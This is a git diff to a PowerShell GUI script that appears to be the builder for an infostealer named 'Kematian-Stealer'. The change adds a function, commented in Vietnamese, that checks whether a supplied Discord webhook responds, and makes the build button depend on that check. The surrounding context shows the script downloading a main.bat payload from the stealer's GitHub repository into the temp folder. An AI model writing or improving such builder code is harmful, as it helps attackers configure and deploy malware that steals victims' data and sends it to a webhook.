@@ -1,3 +1,24 @@
+function CheckValid {
+    param(
+        [string]$webhook
+    )
+    
+    # Kiểm tra nếu $webhook không rỗng và phù hợp định dạng của Discord webhook
+    if (-not [string]::IsNullOrWhiteSpace($webhook)) {
+        try {
+            $response = Invoke-WebRequest -Uri $webhook -Method Get
+            return $response.StatusCode -eq 200
+        } catch {
+            Write-Host "Error checking webhook: $_"
+            return $false
+        }
+    } else {
+        Write-Host "Invalid Discord webhook provided."
+        return $false
+    }
+}
+
+
 function Encode-Base64 {
     param (
         [string]$InputString
@@ -112,7 +133,7 @@ $form.Controls.Add($button)
 # Define the button click event
 $button.Add_Click({
     $webhook = $textbox.Text
-    if (-not [string]::IsNullOrWhiteSpace($webhook)) {
+    if (CheckValid -webhook $webhook) {
         $url = "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/main.bat"
         $filePath = "$env:TEMP\main.bat"
         $filePathprotect = ".\main.bat"
